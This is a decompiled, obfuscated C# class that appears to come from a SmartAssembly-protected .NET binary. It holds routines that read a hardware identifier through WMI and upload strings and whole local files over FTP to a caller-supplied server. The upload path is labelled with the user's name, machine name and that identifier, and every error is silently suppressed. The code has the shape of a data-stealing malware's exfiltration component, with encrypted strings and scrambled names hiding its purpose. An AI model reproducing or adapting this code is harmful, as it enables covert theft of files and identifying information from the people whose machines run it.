using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace zvenNXaGjQywAfJS;

internal sealed class OtanrfhnzOcptTQBO
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string ZmCQYDHnCyhy()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107409138));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107409117)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107409132);
			ManagementObject val3 = new ManagementObject(getString_0(107409127) + text + getString_0(107409054));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107409049)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107395127);
		}
	}

	public static void kofdKDbeRaOR(string wEVEYwzfxxoh = "URL", string SCZlKJtkco = "USERNAME", string aBgpvchsHwauJ = "ACCESO", string rFuOHHSKIpA = "")
	{
		try
		{
			string text = ZmCQYDHnCyhy();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(wEVEYwzfxxoh + getString_0(107410339) + Environment.UserName + getString_0(107409782) + Environment.MachineName + getString_0(107409793) + text + getString_0(107409756));
			ftpWebRequest.Method = getString_0(107409056);
			ftpWebRequest.Credentials = new NetworkCredential(SCZlKJtkco, aBgpvchsHwauJ);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(rFuOHHSKIpA);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void YuzywFDNbOPuQ(string mUkqmSLbUeDuo = "URL", string LqJEnniWgjFslf = "USERNAME", string CkhWphrzWzpqsU = "ACCESO", string nFHQuTqKQgjEotn = "")
	{
		try
		{
			string text = ZmCQYDHnCyhy();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(mUkqmSLbUeDuo + getString_0(107410339) + Environment.UserName + getString_0(107409782) + Environment.MachineName + getString_0(107409793) + text + getString_0(107409793) + Path.GetFileName(nFHQuTqKQgjEotn));
			ftpWebRequest.Method = getString_0(107409056);
			ftpWebRequest.Credentials = new NetworkCredential(LqJEnniWgjFslf, CkhWphrzWzpqsU);
			byte[] array = File.ReadAllBytes(nFHQuTqKQgjEotn);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static OtanrfhnzOcptTQBO()
	{
		Strings.CreateGetStringDelegate(typeof(OtanrfhnzOcptTQBO));
	}
}
